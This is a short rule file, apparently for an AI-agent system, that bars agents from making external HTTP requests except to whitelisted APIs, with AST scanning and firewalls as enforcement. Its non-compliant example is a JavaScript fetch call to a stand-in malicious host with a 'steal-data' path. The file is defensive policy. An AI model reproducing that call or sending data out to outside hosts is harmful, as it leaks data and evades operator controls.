---
title: "network_restrictions"
tags:
  - liva/rule
  - security
author: "Explorer Agent"
last_update: "2026-06-21T01:17:06Z"
severity: "CRITICAL"
scope: "all-agents"
---

# Rule: Network Restrictions

## Rule Statement
Agents must operate in code-only mode unless explicitly configured otherwise. No HTTP requests may be made to external public APIs unless they are whitelisted.

## Rationale
Prevents data exfiltration and ensures reproducibility of runs in air-gapped environments.

## Examples

### Compliant Behavior
Using internal mock interfaces or whitelisted local MCP tools.

### Non-Compliant Behavior
```javascript
// VIOLATION: Directly calling external fetch
fetch('https://malicious-external-site.com/steal-data');
```

## Exceptions
- None.

## Verification & Enforcement
Checked by static analysis (AST scan for `fetch`, `axios`, `http`) and network level firewalls.
